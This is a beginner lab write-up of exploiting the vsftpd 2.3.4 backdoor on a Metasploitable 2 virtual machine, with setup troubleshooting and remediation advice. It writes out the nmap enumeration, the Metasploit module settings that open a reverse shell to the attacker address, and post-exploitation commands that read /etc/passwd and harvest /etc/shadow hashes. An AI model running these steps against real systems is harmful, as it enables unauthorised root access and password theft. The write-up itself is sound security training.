# Lab 2 — vsftpd 2.3.4 Backdoor Exploit

## Overview
- **Target:** Metasploitable 2
- **Target IP:** 192.168.56.101
- **Attacker IP:** 192.168.56.103
- **Date:** 2026-04-22
- **Difficulty:** Beginner

## Vulnerability
vsftpd 2.3.4 contained a backdoor introduced into the source code in 2011.
When a username containing the string `:)` is sent during FTP login, the
daemon opens a root shell on port 6200.

- **CVE:** CVE-2011-2523
- **Service:** FTP
- **Port:** 21
- **Impact:** Unauthenticated remote code execution as root

---

## Setup & Troubleshooting

### Issue 1 — msfconsole would not open
**Problem:** Running `msfconsole` produced no output or errors.
**Cause:** PostgreSQL database backend was not running.
**Fix:**
```bash
sudo service postgresql start
sudo msfdb init
msfconsole
```

### Issue 2 — VMs could not see each other on the network
**Problem:** `sudo arp-scan -l` returned no devices except the VirtualBox
gateway (10.0.2.2) and DNS server (10.0.2.3).
**Cause:** Both VMs were on NAT adapters, which isolate each VM from
each other. They could reach the internet but not communicate directly.
**Fix:** Changed both VMs to Host-Only Adapter in VirtualBox:
1. File → Tools → Network Manager → create vboxnet0
2. Kali VM → Settings → Network → Adapter 1 → Host-only Adapter → vboxnet0
3. Metasploitable VM → same steps
4. Powered off both VMs before changing settings, then rebooted

After the fix, `arp-scan -l` correctly showed both machine IPs on the
192.168.56.0/24 subnet.

### Issue 3 — arp-scan flag typo
**Problem:** Running `sudo arp-scan -1` returned "-1 is unrecognized".
**Cause:** Typed the number `1` instead of lowercase letter `l`.
**Fix:**
```bash
sudo arp-scan -l    # lowercase L, not the number 1
```

### Issue 4 — LHOST validation error
**Problem:** Running the exploit returned:
```
msf :: OptionValidateError One or more options failed to validate: LHOST
```
**Cause:** Metasploit did not know the attacker's IP for the reverse
connection. LHOST must always be set to your Kali machine's IP.
**Fix:**
```bash
# First confirmed Kali IP with:
ip addr show
# eth0 showed 192.168.56.103

set LHOST 192.168.56.103
```

---

## Enumeration
Identified the vulnerable service via nmap:

```bash
nmap -sV 192.168.56.101
```

Output showed:
```
21/tcp open ftp vsftpd 2.3.4
```

---

## Exploitation

Launched Metasploit and ran the module:

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
set LHOST 192.168.56.103
run
```

### Result
```
[*] Started reverse TCP handler on 192.168.56.103:4444
[+] 192.168.56.101:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.56.103:4444 -> 192.168.56.101:43388)
```

Dropped into a native shell and confirmed root access:

```bash
shell
whoami   # root
id       # uid=0(root) gid=0(root)
```

Note: `whoami` and `id` do not work directly in a Meterpreter session.
Use `getuid` and `sysinfo` in Meterpreter, or run `shell` first to drop
into a native bash shell where standard Linux commands work normally.

---

## Post-Exploitation

```bash
cat /etc/passwd    # enumerated all system users
cat /etc/shadow    # harvested hashed passwords
uname -a           # checked kernel version
```

---

## Lessons Learned
- Always start postgresql before launching msfconsole
- NAT and Host-Only are very different — NAT isolates VMs from each
  other, Host-Only puts them on a shared private network
- LHOST must always be set to your attacker machine's IP
- Meterpreter and a native shell are different environments with
  different available commands — use `shell` to drop into bash
- A single unpatched service version can expose full root access

## Remediation
- Update vsftpd to a patched version
- Restrict FTP access by IP via firewall rules
- Consider replacing FTP with SFTP entirely
- Monitor port 6200 for unexpected activity

